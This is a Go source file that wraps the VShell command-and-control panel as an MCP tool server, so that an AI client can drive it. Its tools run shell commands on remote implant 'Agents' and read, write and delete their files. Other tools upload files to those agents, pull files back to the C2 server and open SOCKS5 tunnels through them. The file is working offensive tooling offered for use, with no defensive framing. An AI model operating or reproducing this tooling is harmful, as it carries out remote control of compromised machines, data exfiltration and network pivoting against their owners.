package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"
)

const mcpProtocolDefault = "2024-11-05"

type mcpRequest struct {
	JSONRPC string          `json:"jsonrpc"`
	ID      json.RawMessage `json:"id,omitempty"`
	Method  string          `json:"method"`
	Params  json.RawMessage `json:"params,omitempty"`
}

type mcpError struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
}

type mcpResponse struct {
	JSONRPC string          `json:"jsonrpc"`
	ID      json.RawMessage `json:"id"`
	Result  any             `json:"result,omitempty"`
	Error   *mcpError       `json:"error,omitempty"`
}

type mcpTool struct {
	Name        string         `json:"name"`
	Description string         `json:"description"`
	InputSchema map[string]any `json:"inputSchema"`
}

type mcpServer struct {
	cfg *Config
	c   *Client
}

func cmdMCP(cfg *Config, c *Client, args []string) error {
	fs := newFlagSet("mcp")
	printOnly := fs.Bool("print-config", false, "只打印 MCP 配置后退出")
	if err := fs.Parse(args); err != nil {
		return err
	}

	snippet, err := mcpConfigSnippet(cfg)
	if err != nil {
		return err
	}
	if *printOnly {
		fmt.Println(snippet)
		return nil
	}

	fmt.Fprintln(os.Stderr, "MCP 配置信息（放入客户端的 mcpServers）:")
	fmt.Fprintln(os.Stderr, snippet)
	fmt.Fprintln(os.Stderr)
	fmt.Fprintln(os.Stderr, "MCP stdio 服务已启动，等待客户端请求（Ctrl-D 退出）...")
	return serveMCP(cfg, c, os.Stdin, os.Stdout)
}

func mcpConfigSnippet(cfg *Config) (string, error) {
	exe, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("获取可执行文件路径失败: %w", err)
	}
	if abs, err := filepath.Abs(exe); err == nil {
		exe = abs
	}

	args := make([]string, 0, 5)
	if cfg.Insecure {
		args = append(args, "--insecure")
	}
	args = append(args, "--config", displayPath(cfg.ConfigFile), "mcp")

	doc := map[string]any{
		"mcpServers": map[string]any{
			"vshell-cli": map[string]any{
				"command": exe,
				"args":    args,
			},
		},
	}
	b, err := json.MarshalIndent(doc, "", "  ")
	if err != nil {
		return "", err
	}
	return string(b), nil
}

func serveMCP(cfg *Config, c *Client, in io.Reader, out io.Writer) error {
	br := bufio.NewReader(in)
	bw := bufio.NewWriter(out)
	s := &mcpServer{cfg: cfg, c: c}
	framed := false

	for {
		body, isFramed, err := readMCPMessage(br)
		if errors.Is(err, io.EOF) {
			return nil
		}
		if err != nil {
			return err
		}
		if isFramed {
			framed = true
		}

		var msg mcpRequest
		if err := json.Unmarshal(body, &msg); err != nil {
			_ = writeMCPMessage(bw, mcpResponse{
				JSONRPC: "2.0",
				ID:      json.RawMessage("null"),
				Error:   &mcpError{Code: -32700, Message: "Parse error"},
			}, framed)
			continue
		}

		result, rerr, respond := s.dispatch(&msg)
		if !respond || len(msg.ID) == 0 {
			continue
		}
		resp := mcpResponse{JSONRPC: "2.0", ID: msg.ID}
		if rerr != nil {
			resp.Error = rerr
		} else {
			resp.Result = result
		}
		if err := writeMCPMessage(bw, resp, framed); err != nil {
			return err
		}
	}
}

func (s *mcpServer) dispatch(msg *mcpRequest) (any, *mcpError, bool) {
	if msg.JSONRPC != "" && msg.JSONRPC != "2.0" {
		return nil, &mcpError{Code: -32600, Message: "Invalid Request"}, true
	}

	switch msg.Method {
	case "initialize":
		var p struct {
			ProtocolVersion string `json:"protocolVersion"`
		}
		_ = json.Unmarshal(msg.Params, &p)
		pv := p.ProtocolVersion
		if pv == "" {
			pv = mcpProtocolDefault
		}
		return map[string]any{
			"protocolVersion": pv,
			"capabilities":    map[string]any{"tools": map[string]any{}},
			"serverInfo":      map[string]any{"name": "vshell-cli", "version": version},
			"instructions":    "VShell C2 命令行工具的 MCP 封装。请先在 config.ini 中填写面板地址、用户名和密码。",
		}, nil, true

	case "notifications/initialized", "notifications/cancelled", "notifications/progress":
		return nil, nil, false

	case "ping":
		return map[string]any{}, nil, true

	case "tools/list":
		return map[string]any{"tools": mcpToolList()}, nil, true

	case "resources/list":
		return map[string]any{"resources": []any{}}, nil, true

	case "prompts/list":
		return map[string]any{"prompts": []any{}}, nil, true

	case "tools/call":
		var p struct {
			Name      string          `json:"name"`
			Arguments json.RawMessage `json:"arguments"`
		}
		if err := json.Unmarshal(msg.Params, &p); err != nil || p.Name == "" {
			return mcpTextResult("tools/call 参数无效", true), nil, true
		}
		args, err := mcpArguments(p.Arguments)
		if err != nil {
			return mcpTextResult(err.Error(), true), nil, true
		}
		value, err := s.callTool(p.Name, args)
		if err != nil {
			return mcpTextResult(err.Error(), true), nil, true
		}
		return mcpTextResult(value, false), nil, true
	}

	return nil, &mcpError{Code: -32601, Message: "Method not found: " + msg.Method}, true
}

func mcpTextResult(v any, isError bool) map[string]any {
	var text string
	switch t := v.(type) {
	case string:
		text = t
	default:
		b, err := json.MarshalIndent(v, "", "  ")
		if err != nil {
			text = fmt.Sprint(v)
		} else {
			text = string(b)
		}
	}
	return map[string]any{
		"content": []any{map[string]any{"type": "text", "text": text}},
		"isError": isError,
	}
}

func readMCPMessage(br *bufio.Reader) ([]byte, bool, error) {
	for {
		line, err := br.ReadString('\n')
		if err != nil && !errors.Is(err, io.EOF) {
			return nil, false, err
		}
		text := strings.TrimRight(line, "\r\n")
		if text == "" {
			if errors.Is(err, io.EOF) {
				return nil, false, io.EOF
			}
			continue
		}

		if strings.HasPrefix(strings.ToLower(text), "content-length:") {
			n, perr := mcpContentLength(text)
			if perr != nil {
				return nil, true, perr
			}
			for {
				h, herr := br.ReadString('\n')
				if herr != nil && !errors.Is(herr, io.EOF) {
					return nil, true, herr
				}
				ht := strings.TrimRight(h, "\r\n")
				if ht == "" {
					break
				}
				if strings.HasPrefix(strings.ToLower(ht), "content-length:") {
					if n, perr = mcpContentLength(ht); perr != nil {
						return nil, true, perr
					}
				}
				if errors.Is(herr, io.EOF) {
					break
				}
			}
			body := make([]byte, n)
			if _, rerr := io.ReadFull(br, body); rerr != nil {
				return nil, true, rerr
			}
			return body, true, nil
		}

		return []byte(text), false, nil
	}
}

func mcpContentLength(line string) (int, error) {
	n, err := strconv.Atoi(strings.TrimSpace(line[len("content-length:"):]))
	if err != nil || n < 0 || n > 64<<20 {
		return 0, errors.New("无效的 Content-Length")
	}
	return n, nil
}

func writeMCPMessage(bw *bufio.Writer, v any, framed bool) error {
	b, err := json.Marshal(v)
	if err != nil {
		return err
	}
	if framed {
		if _, err := fmt.Fprintf(bw, "Content-Length: %d\r\n\r\n", len(b)); err != nil {
			return err
		}
	}
	if _, err := bw.Write(b); err != nil {
		return err
	}
	if !framed {
		if err := bw.WriteByte('\n'); err != nil {
			return err
		}
	}
	return bw.Flush()
}

func mcpArguments(raw json.RawMessage) (map[string]any, error) {
	if len(raw) == 0 || string(raw) == "null" {
		return map[string]any{}, nil
	}
	var m map[string]any
	if err := json.Unmarshal(raw, &m); err != nil {
		return nil, fmt.Errorf("arguments 不是对象: %w", err)
	}
	if m == nil {
		m = map[string]any{}
	}
	return m, nil
}

func mcpString(args map[string]any, key string) (string, bool) {
	v, ok := args[key]
	if !ok || v == nil {
		return "", false
	}
	s, ok := v.(string)
	return s, ok
}

func mcpRequiredString(args map[string]any, key string) (string, error) {
	s, ok := mcpString(args, key)
	if !ok || s == "" {
		return "", fmt.Errorf("缺少参数 %s", key)
	}
	return s, nil
}

func mcpInt(args map[string]any, key string, def int) (int, error) {
	v, ok := args[key]
	if !ok || v == nil {
		return def, nil
	}
	switch t := v.(type) {
	case float64:
		if math.Trunc(t) != t {
			return 0, fmt.Errorf("%s 需要整数", key)
		}
		return int(t), nil
	case string:
		n, err := strconv.Atoi(strings.TrimSpace(t))
		if err != nil {
			return 0, fmt.Errorf("%s 需要整数", key)
		}
		return n, nil
	}
	return 0, fmt.Errorf("%s 需要整数", key)
}

func mcpFloat(args map[string]any, key string, def float64) (float64, error) {
	v, ok := args[key]
	if !ok || v == nil {
		return def, nil
	}
	switch t := v.(type) {
	case float64:
		return t, nil
	case string:
		f, err := strconv.ParseFloat(strings.TrimSpace(t), 64)
		if err != nil {
			return 0, fmt.Errorf("%s 需要数字", key)
		}
		return f, nil
	}
	return 0, fmt.Errorf("%s 需要数字", key)
}

func mcpClientID(args map[string]any) (int, error) {
	n, err := mcpInt(args, "client_id", 0)
	if err != nil {
		return 0, err
	}
	if n <= 0 {
		return 0, errors.New("client_id 需要正整数")
	}
	return n, nil
}

func mcpDuration(args map[string]any, key string, def, max float64) (time.Duration, error) {
	secs, err := mcpFloat(args, key, def)
	if err != nil {
		return 0, err
	}
	if secs <= 0 || secs > max {
		return 0, fmt.Errorf("%s 需要在 1-%g 秒之间", key, max)
	}
	return time.Duration(secs * float64(time.Second)), nil
}

func (s *mcpServer) callTool(name string, args map[string]any) (any, error) {
	switch name {
	case "vshell_info":
		return s.toolInfo()
	case "vshell_clients":
		return s.toolClients(args)
	case "vshell_exec":
		return s.toolExec(args)
	case "vshell_exec_async":
		return s.toolExecAsync(args)
	case "vshell_disks":
		return s.toolDisks(args)
	case "vshell_ls":
		return s.toolLs(args)
	case "vshell_cat":
		return s.toolCat(args)
	case "vshell_write":
		return s.toolWrite(args)
	case "vshell_rm":
		return s.toolRm(args)
	case "vshell_upload":
		return s.toolUpload(args)
	case "vshell_download":
		return s.toolDownload(args)
	case "vshell_listeners":
		return s.toolListeners()
	case "vshell_runners":
		return s.toolRunners()
	case "vshell_socks_start":
		return s.toolSocksStart(args)
	case "vshell_socks_stop":
		return s.toolSocksStop(args)
	case "vshell_socks_list":
		return s.toolSocksList(args)
	case "vshell_diagnose":
		return s.toolDiagnose()
	}
	return nil, fmt.Errorf("未知工具: %s", name)
}

func (s *mcpServer) toolInfo() (any, error) {
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	d, err := s.c.Dashboard()
	if err != nil {
		return nil, err
	}
	return map[string]any{"url": s.cfg.URL, "dashboard": d}, nil
}

func (s *mcpServer) toolClients(args map[string]any) (any, error) {
	status := "online"
	if v, ok := mcpString(args, "status"); ok && v != "" {
		status = v
	}
	st, err := normalizeStatus(status)
	if err != nil {
		return nil, err
	}
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	list, err := s.c.Agents(st)
	if err != nil {
		return nil, err
	}
	return list, nil
}

func (s *mcpServer) toolExec(args map[string]any) (any, error) {
	id, err := mcpClientID(args)
	if err != nil {
		return nil, err
	}
	command, err := mcpRequiredString(args, "command")
	if err != nil {
		return nil, err
	}
	timeout, err := mcpDuration(args, "timeout", 30, 600)
	if err != nil {
		return nil, err
	}
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	raw, err := s.c.ExecShell(id, command, timeout)
	out := extractShellOutput(raw, command)
	if err != nil {
		if out == "(无输出)" {
			return nil, err
		}
		return nil, fmt.Errorf("%v\n输出:\n%s", err, out)
	}
	return map[string]any{"client_id": id, "command": command, "output": out}, nil
}

func (s *mcpServer) toolExecAsync(args map[string]any) (any, error) {
	id, err := mcpClientID(args)
	if err != nil {
		return nil, err
	}
	command, err := mcpRequiredString(args, "command")
	if err != nil {
		return nil, err
	}
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	if err := s.c.ExecAsync(id, command); err != nil {
		return nil, err
	}
	return map[string]any{"client_id": id, "command": command, "sent": true}, nil
}

func (s *mcpServer) toolDisks(args map[string]any) (any, error) {
	id, err := mcpClientID(args)
	if err != nil {
		return nil, err
	}
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	disks, err := s.c.Disks(id)
	if err != nil {
		return nil, err
	}
	return disks, nil
}

func (s *mcpServer) toolLs(args map[string]any) (any, error) {
	id, err := mcpClientID(args)
	if err != nil {
		return nil, err
	}
	path, err := mcpRequiredString(args, "path")
	if err != nil {
		return nil, err
	}
	page, err := mcpInt(args, "page", 1)
	if err != nil {
		return nil, err
	}
	pageSize, err := mcpInt(args, "page_size", 100)
	if err != nil {
		return nil, err
	}
	if page <= 0 || pageSize <= 0 || pageSize > 1000 {
		return nil, errors.New("page 需为正数，page_size 需在 1-1000 之间")
	}
	sortBy := "time"
	if v, ok := mcpString(args, "sort_by"); ok && v != "" {
		sortBy = v
	}
	order := "descend"
	if v, ok := mcpString(args, "order"); ok && v != "" {
		order = v
	}
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	list, err := s.c.ListDir(id, path, page, pageSize, sortBy, order)
	if err != nil {
		return nil, err
	}
	return list, nil
}

func (s *mcpServer) toolCat(args map[string]any) (any, error) {
	id, err := mcpClientID(args)
	if err != nil {
		return nil, err
	}
	path, err := mcpRequiredString(args, "path")
	if err != nil {
		return nil, err
	}
	maxBytes, err := mcpInt(args, "max_bytes", 102400)
	if err != nil {
		return nil, err
	}
	if maxBytes <= 0 || maxBytes > 1<<20 {
		return nil, errors.New("max_bytes 需要在 1-1048576 之间")
	}
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	data, err := s.c.ReadFile(id, path)
	if err != nil {
		return nil, err
	}
	total := len(data)
	truncated := false
	if total > maxBytes {
		data = data[:maxBytes]
		truncated = true
	}
	out := map[string]any{
		"client_id": id,
		"path":      path,
		"size":      total,
		"truncated": truncated,
	}
	if utf8.Valid(data) {
		out["encoding"] = "utf-8"
		out["text"] = string(data)
	} else {
		out["encoding"] = "base64"
		out["base64"] = base64.StdEncoding.EncodeToString(data)
	}
	return out, nil
}

func (s *mcpServer) toolWrite(args map[string]any) (any, error) {
	id, err := mcpClientID(args)
	if err != nil {
		return nil, err
	}
	path, err := mcpRequiredString(args, "path")
	if err != nil {
		return nil, err
	}
	content, hasContent := mcpString(args, "content")
	localFile, hasFile := mcpString(args, "local_file")
	if hasContent && hasFile {
		return nil, errors.New("content 与 local_file 只能提供一个")
	}
	if !hasContent && !hasFile {
		return nil, errors.New("需要提供 content 或 local_file")
	}
	if hasFile {
		data, err := os.ReadFile(localFile)
		if err != nil {
			return nil, fmt.Errorf("读取本地文件失败: %w", err)
		}
		content = string(data)
	}
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	if err := s.c.WriteFile(id, path, content); err != nil {
		return nil, err
	}
	return map[string]any{"client_id": id, "path": path, "bytes": len(content), "written": true}, nil
}

func (s *mcpServer) toolRm(args map[string]any) (any, error) {
	id, err := mcpClientID(args)
	if err != nil {
		return nil, err
	}
	path, err := mcpRequiredString(args, "path")
	if err != nil {
		return nil, err
	}
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	if err := s.c.RemoveFile(id, path); err != nil {
		return nil, err
	}
	return map[string]any{"client_id": id, "path": path, "removed": true}, nil
}

func (s *mcpServer) toolUpload(args map[string]any) (any, error) {
	id, err := mcpClientID(args)
	if err != nil {
		return nil, err
	}
	localPath, err := mcpRequiredString(args, "local_path")
	if err != nil {
		return nil, err
	}
	remotePath, _ := mcpString(args, "remote_path")
	timeout, err := mcpDuration(args, "timeout", 120, 600)
	if err != nil {
		return nil, err
	}
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	resp, err := s.c.Upload(id, localPath, remotePath, timeout)
	if err != nil {
		return nil, err
	}
	if !resp.OK() {
		return nil, errors.New(resp.ErrText())
	}
	if remotePath == "" {
		remotePath = filepath.Base(localPath)
	}
	return map[string]any{"client_id": id, "local_path": localPath, "remote_path": remotePath, "uploaded": true}, nil
}

func (s *mcpServer) toolDownload(args map[string]any) (any, error) {
	id, err := mcpClientID(args)
	if err != nil {
		return nil, err
	}
	path, err := mcpRequiredString(args, "remote_path")
	if err != nil {
		return nil, err
	}
	wait, err := mcpDuration(args, "wait", 30, 600)
	if err != nil {
		return nil, err
	}
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	size, err := s.c.DownloadFromAgent(id, path, wait, nil)
	if err != nil {
		return nil, err
	}
	return map[string]any{"client_id": id, "remote_path": path, "size": size, "downloaded_to_server": true}, nil
}

func (s *mcpServer) toolListeners() (any, error) {
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	list, err := s.c.Listeners()
	if err != nil {
		return nil, err
	}
	return list, nil
}

func (s *mcpServer) toolRunners() (any, error) {
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	list, err := s.c.Runners()
	if err != nil {
		return nil, err
	}
	return list, nil
}

func (s *mcpServer) toolSocksStart(args map[string]any) (any, error) {
	id, err := mcpClientID(args)
	if err != nil {
		return nil, err
	}
	port, err := mcpInt(args, "port", 1080)
	if err != nil {
		return nil, err
	}
	if port <= 0 || port > 65535 {
		return nil, errors.New("port 需要在 1-65535 之间")
	}
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	tunnelID, err := s.c.StartTunnel(id, port)
	if err != nil {
		return nil, err
	}
	return map[string]any{"client_id": id, "port": port, "tunnel_id": tunnelID, "started": true}, nil
}

func (s *mcpServer) toolSocksStop(args map[string]any) (any, error) {
	port, err := mcpInt(args, "port", 0)
	if err != nil {
		return nil, err
	}
	if port <= 0 || port > 65535 {
		return nil, errors.New("port 需要在 1-65535 之间")
	}
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	tunnelID, err := s.c.StopTunnelByPort(port)
	if err != nil {
		return nil, err
	}
	return map[string]any{"port": port, "tunnel_id": tunnelID, "stopped": true}, nil
}

func (s *mcpServer) toolSocksList(args map[string]any) (any, error) {
	id, err := mcpInt(args, "client_id", 0)
	if err != nil {
		return nil, err
	}
	if id < 0 {
		return nil, errors.New("client_id 不能为负数")
	}
	if err := s.c.EnsureLogin(); err != nil {
		return nil, err
	}
	list, err := s.c.Tunnels(id)
	if err != nil {
		return nil, err
	}
	return list, nil
}

func (s *mcpServer) toolDiagnose() (any, error) {
	out := map[string]any{"cli_version": version}
	if err := s.c.EnsureLogin(); err != nil {
		out["vshell_ok"] = false
		out["vshell_error"] = "登录失败: " + err.Error()
	} else if d, err := s.c.Dashboard(); err != nil {
		out["vshell_ok"] = false
		out["vshell_error"] = err.Error()
	} else {
		out["vshell_ok"] = true
		out["dashboard"] = d
	}
	if v, err := curlVersion(); err != nil {
		out["curl_ok"] = false
		out["curl_error"] = err.Error()
	} else {
		out["curl_ok"] = true
		out["curl_version"] = v
	}
	return out, nil
}

func mcpToolList() []mcpTool {
	str := func(desc string) map[string]any {
		return map[string]any{"type": "string", "description": desc}
	}
	integer := func(desc string) map[string]any {
		return map[string]any{"type": "integer", "description": desc}
	}
	number := func(desc string) map[string]any {
		return map[string]any{"type": "number", "description": desc}
	}
	schema := func(props map[string]any, required ...string) map[string]any {
		s := map[string]any{"type": "object", "properties": props}
		if len(required) > 0 {
			s["required"] = required
		}
		return s
	}
	clientID := integer("Agent ID（正整数）")
	path := str("远程路径")

	return []mcpTool{
		{
			Name:        "vshell_info",
			Description: "查看 VShell 面板版本、在线 Agent、监听器、SOCKS5 隧道和授权截止时间。",
			InputSchema: schema(map[string]any{}),
		},
		{
			Name:        "vshell_clients",
			Description: "列出 Agent。status 可选 online、offline、all，默认 online。",
			InputSchema: schema(map[string]any{
				"status": map[string]any{
					"type": "string", "description": "在线状态过滤",
					"enum": []string{"online", "offline", "all"},
				},
			}),
		},
		{
			Name:        "vshell_exec",
			Description: "在指定 Agent 上同步执行命令并返回输出。",
			InputSchema: schema(map[string]any{
				"client_id": clientID,
				"command":   str("要执行的命令"),
				"timeout":   number("等待秒数，默认 30，最大 600"),
			}, "client_id", "command"),
		},
		{
			Name:        "vshell_exec_async",
			Description: "向指定 Agent 异步下发命令，不等待执行结果。",
			InputSchema: schema(map[string]any{
				"client_id": clientID,
				"command":   str("要执行的命令"),
			}, "client_id", "command"),
		},
		{
			Name:        "vshell_disks",
			Description: "列出指定 Agent 的磁盘。",
			InputSchema: schema(map[string]any{"client_id": clientID}, "client_id"),
		},
		{
			Name:        "vshell_ls",
			Description: "列出指定 Agent 的目录内容，支持分页和排序。",
			InputSchema: schema(map[string]any{
				"client_id": clientID,
				"path":      path,
				"page":      integer("页码，默认 1"),
				"page_size": integer("每页数量，默认 100，最大 1000"),
				"sort_by": map[string]any{
					"type": "string", "description": "排序字段",
					"enum": []string{"name", "time", "size"},
				},
				"order": map[string]any{
					"type": "string", "description": "排序方向",
					"enum": []string{"ascend", "descend"},
				},
			}, "client_id", "path"),
		},
		{
			Name:        "vshell_cat",
			Description: "读取指定 Agent 上的文件。文本返回 text，二进制返回 base64。",
			InputSchema: schema(map[string]any{
				"client_id": clientID,
				"path":      str("远程文件路径"),
				"max_bytes": integer("最多读取字节数，默认 102400，最大 1048576"),
			}, "client_id", "path"),
		},
		{
			Name:        "vshell_write",
			Description: "向指定 Agent 写入文件。content 与 local_file 二选一。",
			InputSchema: schema(map[string]any{
				"client_id":  clientID,
				"path":       str("远程文件路径"),
				"content":    str("直接写入的文本内容"),
				"local_file": str("从 MCP 服务所在机器读取的本地文件路径"),
			}, "client_id", "path"),
		},
		{
			Name:        "vshell_rm",
			Description: "删除指定 Agent 上的文件或目录。",
			InputSchema: schema(map[string]any{
				"client_id": clientID,
				"path":      path,
			}, "client_id", "path"),
		},
		{
			Name:        "vshell_upload",
			Description: "把 MCP 服务所在机器上的文件上传到指定 Agent。",
			InputSchema: schema(map[string]any{
				"client_id":   clientID,
				"local_path":  str("本地文件路径"),
				"remote_path": str("远程目标路径，默认使用文件名"),
				"timeout":     number("上传超时秒数，默认 120，最大 600"),
			}, "client_id", "local_path"),
		},
		{
			Name:        "vshell_download",
			Description: "让 C2 从指定 Agent 拉取文件到 C2 服务器（不是下载到本地）。",
			InputSchema: schema(map[string]any{
				"client_id":   clientID,
				"remote_path": str("Agent 上的文件路径"),
				"wait":        number("等待秒数，默认 30，最大 600"),
			}, "client_id", "remote_path"),
		},
		{
			Name:        "vshell_listeners",
			Description: "列出 VShell 监听器。",
			InputSchema: schema(map[string]any{}),
		},
		{
			Name:        "vshell_runners",
			Description: "列出 VShell 内置工具。",
			InputSchema: schema(map[string]any{}),
		},
		{
			Name:        "vshell_socks_start",
			Description: "为指定 Agent 创建并启动 SOCKS5 隧道。",
			InputSchema: schema(map[string]any{
				"client_id": clientID,
				"port":      integer("隧道端口，默认 1080"),
			}, "client_id"),
		},
		{
			Name:        "vshell_socks_stop",
			Description: "按端口停止并删除 SOCKS5 隧道。",
			InputSchema: schema(map[string]any{
				"port": integer("隧道端口"),
			}, "port"),
		},
		{
			Name:        "vshell_socks_list",
			Description: "列出 SOCKS5 隧道。client_id 省略时列出全部。",
			InputSchema: schema(map[string]any{
				"client_id": integer("Agent ID，省略则列出全部"),
			}),
		},
		{
			Name:        "vshell_diagnose",
			Description: "诊断 VShell 登录、面板接口和系统 curl。",
			InputSchema: schema(map[string]any{}),
		},
	}
}
